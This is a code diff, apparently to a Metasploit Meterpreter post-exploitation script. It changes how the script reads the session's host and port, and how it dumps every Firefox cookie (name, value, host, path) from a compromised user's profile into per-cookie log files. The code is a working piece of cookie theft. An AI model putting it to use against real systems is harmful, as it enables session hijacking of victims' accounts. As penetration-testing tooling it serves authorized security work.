@@ -7,7 +7,7 @@
 require 'sqlite3'
 @client = client
 kill_frfx = false
-host,port = session.tunnel_peer.split(':')
+host,port = session.session_host, session.session_port
 # Create Filename info to be appended to downloaded files
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
@@ -162,18 +162,18 @@ def frfxdmp(usrnm)
 	ckfldr = ::File.join(@logs,"firefoxcookies_#{usrnm}")
 	::FileUtils.mkdir_p(ckfldr)
 	db = SQLite3::Database.new(cookiesdb)
+	db.results_as_hash = true
 	print_status("\tGetting Firefox Cookies for #{usrnm}")
 	db.execute("SELECT * FROM moz_cookies;" ) do |item|
-		# item['id', 'name', 'value', 'host', 'path', 'expiry', 'lastAccessed', 'isSecure', 'isHttpOnly']
-		fd = ::File.new(ckfldr + item[0].to_s + "_" + item[3].to_s + ".txt", "w+")
-		fd.puts "Name: " + item[1] + "\n"
-		fd.puts "Value: " + item[2].to_s + "\n"
-		fd.puts "Host: " + item[3] + "\n"
-		fd.puts "Path: " + item[4] + "\n"
-		fd.puts "Expiry: " + item[5].to_s + "\n"
-		fd.puts "lastAccessed: " + item[6].to_s + "\n"
-		fd.puts "isSecure: " + item[7].to_s + "\n"
-		fd.puts "isHttpOnly: " + item[8].to_s + "\n"
+		fd = ::File.new(ckfldr + ::File::Separator + item['id'].to_s + "_" + item['host'].to_s + ".txt", "w+")
+		fd.puts "Name: " + item['name'] + "\n"
+		fd.puts "Value: " + item['value'].to_s + "\n"
+		fd.puts "Host: " + item['host'] + "\n"
+		fd.puts "Path: " + item['path'] + "\n"
+		fd.puts "Expiry: " + item['expiry'].to_s + "\n"
+		fd.puts "lastAccessed: " + item['lastAccessed'].to_s + "\n"
+		fd.puts "isSecure: " + item['isSecure'].to_s + "\n"
+		fd.puts "isHttpOnly: " + item['isHttpOnly'].to_s + "\n"
 		fd.close
 	end
 	return results
